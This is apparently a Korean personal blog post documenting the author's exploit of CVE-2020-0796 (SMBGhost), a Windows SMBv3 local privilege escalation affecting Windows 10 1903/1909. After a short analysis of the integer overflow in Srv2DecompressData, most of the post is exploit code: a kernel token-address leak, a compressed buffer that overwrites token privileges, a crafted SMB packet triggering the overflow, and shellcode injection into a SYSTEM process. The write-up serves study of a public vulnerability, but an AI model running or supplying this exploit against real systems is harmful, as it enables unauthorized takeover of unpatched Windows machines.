---
layout: post
title: Windows SMBv3 LPE exploit
subtitle: CVE-2020-0796(a.k.a - SMBGhost)
tags: [Kernel, Window, 1day]
---

# Intro

내 N-day advisories 문서 목록에서 적당한 1day exploit 해볼만한 것을 찾던 도중, 최근 20년도 자대로 전입한 후에 처음으로 접한 1day 가 생각나 SMBv3 LPE 통칭 SMBGhost 라는 녀석을 익스를 시도해보고자 한다. SMBv3.1.1 압축 메커니즘의 버그이며 Windows 10 버전 1903 및 1909에 영향을 끼친다. EoP(`Elevation of Privilege`), LPE(`Local privilege escalation`) 등 권한 상승은 가능하지만 RCE 로 발현 할 백터가 존재하지 않는다.

# Analysis

해당 취약점은 `srv2.sys` 라는 SMB 드라이버 에서 발견되었으며, `Srv2DecompressData()` 라는 함수에서 `Integer Overflow 취약점`이 발생한다.

```cpp
typedef struct _COMPRESSION_TRANSFORM_HEADER
{
    ULONG ProtocolId;
    ULONG OriginalCompressedSegmentSize;
    USHORT CompressionAlgorithm;
    USHORT Flags;
    ULONG Offset;
} COMPRESSION_TRANSFORM_HEADER, *PCOMPRESSION_TRANSFORM_HEADER;
 
typedef struct _ALLOCATION_HEADER
{
    // ...
    PVOID UserBuffer;
    // ...
} ALLOCATION_HEADER, *PALLOCATION_HEADER;
 
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize)
{
    PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
        (ULONG)(Header->OriginalCompressedSegmentSize + Header->Offset),
        NULL);
    if (!Alloc) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
 
    ULONG FinalCompressedSize = 0;
 
    NTSTATUS Status = SmbCompressionDecompress(
        Header->CompressionAlgorithm,
        (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header->Offset,
        (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header->Offset),
        (PUCHAR)Alloc->UserBuffer + Header->Offset,
        Header->OriginalCompressedSegmentSize,
        &FinalCompressedSize);
    if (Status < 0 || FinalCompressedSize != Header->OriginalCompressedSegmentSize) {
        SrvNetFreeBuffer(Alloc);
        return STATUS_BAD_DATA;
    }
 
    if (Header->Offset > 0) {
        memcpy(
            Alloc->UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header->Offset);
    }
 
    Srv2ReplaceReceiveBuffer(some_session_handle, Alloc);
    return STATUS_SUCCESS;
}
```

해당 Srv2DecompressData 함수는 클라이언트가 전송 한 압축 메세지를 수신하고 필요한 메모리 만큼 할당 한 이후에 해당 영역에 압축을 해제한다. offset 필드가 0 이 아닌 경우 압축 된 데이터 앞에 배치 된 데이터를 할당 된 버퍼의 시작 부분에 그대로 복사한다.

```cpp
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize) {
    // ...
	  PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
        (ULONG)(Header->OriginalCompressedSegmentSize + Header->Offset),
        NULL);
    if (!Alloc) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    // ...
}
```

여기서 가장 중요한 부분은 `SrvNetAllocateBuffer()` 함수 를 실행하는 부분이다. 아까 앞서 말했듯 클라이언트가 전송한 메세지를 압축해제 할 영역을 할당 한 이후에 값을 쓰게 된다. 이때 ULONG 타입으로 `Header->OriginalCompressedSegmentSize + Header->Offset` 만큼 받게 되는데, 이때 ULONG == unsigned long 이며, 이는 `0xFFFFFFFF` 와 같은 값을 넣게 되면, Integer Overflow 를 발생할 수 있다!

우리의 목표는 Allocated Memory 를 할당한 이후, 사이즈를 조정해 Decompress 이후 Decompress Data 영역 뒤의 데이터를 조작할 계획이다. 여기서 두가지 선택지로 나뉘게 되는데 Header 구조체 안의 OriginalCompressedSegmentsize 와 Offset 값 중 어떤 값을 조작해야 하는가 이다. 

```cpp
NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T TotalSize) {
    // ...
    if (Header->Offset > 0) {
        memcpy(
            Alloc->UserBuffer,
            (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
            Header->Offset);
    }
    // ...
}
```

마지막 부분쪽 근처 쯤에서 복사를 할때 `Header->Offset > 0` 라는 조건으로 복사를 시작한다. 만약 `Offset` 의 값을 0 이상의 정수값 그리고  `OriginalCompressedSegmentSize` 값을 음수로 offset 보다 큰 값으로 넘겨준다면 해제되는 메모리 영역의 값 이상으로 덮어서 쓸 수 있게 된다.

[Exploiting SMBGhost (CVE-2020-0796) for a Local Privilege Escalation: Writeup + POC - ZecOps Blog](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)

이제 Kernel pool page 가 어떻게 할당 되는지 살펴보고 싶다면 위의 링크를 참고하면 되겠다.

# Exploit

## Get Token

[code: get process token using NT-Q-sysinfo function in windows Kernel](https://www.notion.so/b4sh5i/code-get-process-token-using-NT-Q-sysinfo-function-in-windows-Kernel-b58ebf548b8d4d719b09c5338ece3c08)

```cpp
ULONG64 get_handle_addr(HANDLE h) {
	ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
		status = NtQuerySystemInformation(SystemExtendedHandleInformation, pHandleInfo, len, &len);
	} while (status == (NTSTATUS)0xc0000004);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation() failed with error: %#x\n", status);
		return 1;
	}

	DWORD mypid = GetProcessId(GetCurrentProcess());
	ULONG64 ptrs[1000] = { 0 };
	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
		PVOID object = pHandleInfo->Handles[i].Object;
		ULONG_PTR handle = pHandleInfo->Handles[i].HandleValue;
		DWORD pid = (DWORD)pHandleInfo->Handles[i].UniqueProcessId;
		if (pid != mypid)
			continue;
		if (handle == (ULONG_PTR)h)
			return (ULONG64)object;
	}
	return -1;
}

ULONG64 get_process_token() {
	HANDLE token;
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (proc == INVALID_HANDLE_VALUE)
		return 0;

	OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token);
	ULONG64 ktoken = get_handle_addr(token);

	return ktoken;
}
```

system 권한으로 상승 시키기 위해 token 을 가져와야 한다. 이와 관련해서는 이미 글도 많이 써놓고 메모도 해놔서 code 정도로 링크를 삽입했다. 필자의 경우에는 NtQuerySystemInformation 함수를 사용해서 했다.

### Compressed Data

```cpp
	ULONG buffer_size = 0x1110;
	UCHAR* buffer = (UCHAR*)malloc(buffer_size);
	if (buffer == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memset(buffer,'A', 0x1108);
	*(uint64_t*)(buffer + 0x1108) = ktoken + 0x40;

	ULONG CompressBufferWorkSapceSize = 0;
	ULONG CompressFragmentWorkSpaceSize = 0;
	err = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_XPRESS, &CompressBufferWorkSapceSize, &CompressFragmentWorkSpaceSize);

	if (err != STATUS_SUCCESS) {
		printf("RtlGetCompressionWorkSpaceSize() Failed : %d\n", err);
		return error_exit(sock, NULL);
	}

	ULONG i = 0;
	ULONG FinalCompressedSize;
	UCHAR compressed_buffer[64];
	LPVOID lpWorkSpace = malloc(CompressBufferWorkSapceSize);
	if (lpWorkSpace == NULL) {
		printf("Not allocate IpWorkSpace !\n");
		return error_exit(sock, NULL);
	}

	err = RtlCompressBuffer(COMPRESSION_FORMAT_XPRESS, buffer, buffer_size, compressed_buffer, sizeof(compressed_buffer), 4096, &FinalCompressedSize, lpWorkSpace);
	if (err != STATUS_SUCCESS) {
		printf("RtlCompressBuffer() failed : %#x\n", err);
		free(lpWorkSpace);
		return error_exit(sock, NULL);
	}
```

다음은 `RtlCompressBuffer` 함수를 사용하기 위한 코드이다. 일단 0x1108 만큼의 데이터를 할당하고 이후에 SMB 통신시에 system 권한의 토큰이 필요하기 때문에 그 뒷부분에 넣어주었다.

아 물론 토큰값을 릭하기전에 SMB 패킷이 가는지 테스트를 먼저 해봐야한다.

```cpp
int send_compressed(SOCKET sock, unsigned char* buffer, ULONG len) {
	int err = 0;
	char response[8] = { 0 };

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,
		0x00, 0x00, 0x33,

		/* SMB Header */
		0xFC, 0x53, 0x4D, 0x42, /* protocol id */
		0xFF, 0xFF, 0xFF, 0xFF, /* original decompressed size, trigger arithmetic overflow */
		0x02, 0x00,             /* compression algorithm, LZ77 */
		0x00, 0x00,             /* flags */
		0x10, 0x00, 0x00, 0x00, /* offset */
	};

	uint8_t* packet = (uint8_t*)malloc(sizeof(buf) + 0x10 + len);
	if (packet == NULL) {
		printf("Couldn't allocate memory with malloc()\n");
		return error_exit(sock, NULL);
	}

	memcpy(packet, buf, sizeof(buf));
	*(uint64_t*)(packet + sizeof(buf)) = 0x1FF2FFFFBC;
	*(uint64_t*)(packet + sizeof(buf) + 0x8) = 0x1FF2FFFFBC;
	memcpy(packet + sizeof(buf) + 0x10, buffer, len);

	if ((err = send(sock, (const char*)packet, sizeof(buf) + 0x10 + len, 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
	}

	free(packet);
	return err;
}
```

머 대충 저렇게 `decompressed size` 를 0xffffffff 로 지정해서 오버플로 터지게 세팅해주고 해당 compress data 를 전송하면 된다.

### Injecting Shellcode

```cpp
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		printf("Could not open process\n");
		return;
	}

	LPVOID lpMem = VirtualAllocEx(hProc, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpMem == NULL) {
		printf("Remote allocation failed\n");
		return;
	}		
	if (!WriteProcessMemory(hProc, lpMem, shellcode, sizeof(shellcode), 0)) {
		printf("Remote write failed\n");
		return;
	}	
	if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMem, 0, 0, 0)) {
		printf("CreateRemoteThread failed\n");
		return;
	}
```

마지막 쉘코딩 인젝션은 다음과 같이 하면 성공적으로 LPE 를 획득 할 수 있다.

# Finally

첫 window kernel exploit 인데 난이도가 생각보다 낮았다. SMB buffer 랑 값 적당히 세팅하고 injecting 해주면 끝이여서 뭔가 좀 대단한 방법 있을 줄 알았는데, 좀 더 케이스 봐야 감이 올꺼 같다. 릭 할때 가끔 안되는 부분 있었는데 이게 되다가 안되다가 해서 의문인데 좀 더 까봐야겠다.

# Refer

- [https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)
- [https://paper.seebug.org/1165/](https://paper.seebug.org/1165/)
- [https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html](https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html)
